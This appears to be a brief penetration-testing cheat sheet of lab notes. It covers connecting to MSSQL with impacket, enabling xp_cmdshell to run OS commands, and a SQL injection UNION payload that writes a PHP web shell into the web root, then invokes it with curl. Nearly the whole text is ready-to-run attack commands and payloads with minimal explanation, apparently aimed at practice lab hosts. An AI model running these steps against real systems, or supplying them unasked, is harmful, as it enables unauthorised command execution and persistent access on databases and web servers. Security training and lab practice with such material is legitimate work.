For MSSQL
`impacket-mssqlclient Administrator:Lab123@192.168.163.18 -windows-auth`

`select @@version;`

`SELECT name FROM sys.databases;`


enable cmdshell

```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
`EXECUTE xp_cmdshell 'whoami';`


##### write webshell to web server
identify the column
`x' union select  database(), @@version, user(), 4 -- //`

`'x' union select "<?php system($_GET['cmd']);?>", null,null,null into outfile "/var/www/html/tmp/webshell.php" -- //`

`curl http://192.168.163.19//tmp/webshell.php?cmd=whoami`
